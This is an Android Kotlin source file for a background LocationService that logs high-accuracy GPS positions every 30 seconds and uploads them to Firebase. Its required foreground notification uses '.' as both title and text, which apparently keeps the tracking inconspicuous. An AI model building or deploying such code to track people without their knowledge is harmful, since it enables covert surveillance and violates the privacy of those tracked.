package com.anmig.autodetect.services

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.anmig.autodetect.models.LocationData
import com.anmig.autodetect.R
import com.anmig.autodetect.utils.FirebaseHelper
import com.anmig.autodetect.utils.Logger
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.Priority

class LocationService : Service() {
    companion object {
        private const val TAG = "LocationService"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "location_service_channel"
        private const val LOCATION_INTERVAL = 30_000L
    }

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var firebaseHelper: FirebaseHelper
    private lateinit var locationCallback: LocationCallback
    private lateinit var locationRequest: LocationRequest
    private var isLocationUpdatesStarted = false

    override fun onCreate() {
        Logger.initialize(this)
        Logger.log("$TAG: onCreate() called")
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        firebaseHelper = FirebaseHelper()
        createNotificationChannel()
        setupLocationRequest()
        setupLocationCallback()
        Logger.log("$TAG: onCreate() completed")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Logger.log("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\nSERVICE STARTED")
        Logger.log("$TAG: onStartCommand() called with startId: $startId")
        startForeground(
            NOTIFICATION_ID,
            createNotification(),
            ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        )
        startLocationUpdates()
        Logger.log("$TAG: onStartCommand() completed, returning START_STICKY")
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        Logger.log("$TAG: onBind() called")
        return null
    }

    private fun createNotificationChannel() {
        Logger.log("$TAG: createNotificationChannel() called")
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Location Service",
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = "Running location tracking service"
        }
        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager.createNotificationChannel(channel)
        Logger.log("$TAG: Notification channel created successfully")
    }

    private fun createNotification(): Notification {
        Logger.log("$TAG: createNotification() called")
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(".")
            .setContentText(".")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setOngoing(true)
            .build()
        Logger.log("$TAG: Notification created successfully")
        return notification
    }

//    private fun updateNotification(text: String) {
//        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
//            .setContentTitle(".")
//            .setContentText(text)
//            .setSmallIcon(R.mipmap.ic_launcher)
//            .setOngoing(true)
//            .build()
//
//        val notificationManager = getSystemService(NotificationManager::class.java)
//        notificationManager.notify(NOTIFICATION_ID, notification)
//    }

    private fun setupLocationRequest() {
        Logger.log("$TAG: setupLocationRequest() called")
        locationRequest =
            LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, LOCATION_INTERVAL)
                .setWaitForAccurateLocation(false)
                .setMinUpdateIntervalMillis(LOCATION_INTERVAL / 2)
                .setMaxUpdateDelayMillis(LOCATION_INTERVAL * 2)
                .build()
        Logger.log("$TAG: Location request configured with interval: ${LOCATION_INTERVAL}ms")
    }

    private fun setupLocationCallback() {
        Logger.log("$TAG: setupLocationCallback() called")
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                Logger.log("$TAG: onLocationResult() called")
                locationResult.lastLocation?.let { location ->
                    Logger.log("$TAG: Processing location - Lat: ${location.latitude}, Lng: ${location.longitude}")
                    val locationData = LocationData(
                        latitude = location.latitude,
                        longitude = location.longitude,
                        timestamp = System.currentTimeMillis()
                    )
                    firebaseHelper.saveLocationOptimized(locationData) { success ->
                        if (success) {
                            //updateNotification("Location encrypted & saved: ${location.latitude}, ${location.longitude}")
                            Logger.log("$TAG: Location encrypted and saved successfully")
                        } else {
                            Logger.log("$TAG: Failed to save encrypted location")
                        }
                    }
                } ?: Logger.log("$TAG: Received null location in onLocationResult")
            }
        }
        Logger.log("$TAG: Location callback setup completed")
    }

//    //FIXME: Remove
//    private val runnable = object : Runnable {
//        override fun run() {
//            Log.d("LocationService", "Running")
//            Handler(Looper.getMainLooper()).postDelayed(this, 1000)
//        }
//    }

    private fun startLocationUpdates() {
        Logger.log("$TAG: startLocationUpdates() called")
        //Handler(Looper.getMainLooper()).postDelayed(runnable, 1000)

        if (isLocationUpdatesStarted) {
            Logger.log("$TAG: Location updates already started, skipping")
            return
        }

        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED || ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            Logger.log("$TAG: Missing location permissions, cannot start updates")
            return
        }

        Logger.log("$TAG: Requesting location updates from FusedLocationProviderClient")
        fusedLocationClient.requestLocationUpdates(
            locationRequest,
            locationCallback,
            Looper.getMainLooper()
        )
        isLocationUpdatesStarted = true
        Logger.log("$TAG: Location updates started successfully")
    }

    override fun onDestroy() {
        Logger.log("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\nSERVICE DESTROYED")
        Logger.log("$TAG: onDestroy() called")
        fusedLocationClient.removeLocationUpdates(locationCallback)
        isLocationUpdatesStarted = false
        Logger.log("$TAG: Location updates stopped and service destroyed")
        super.onDestroy()
    }
}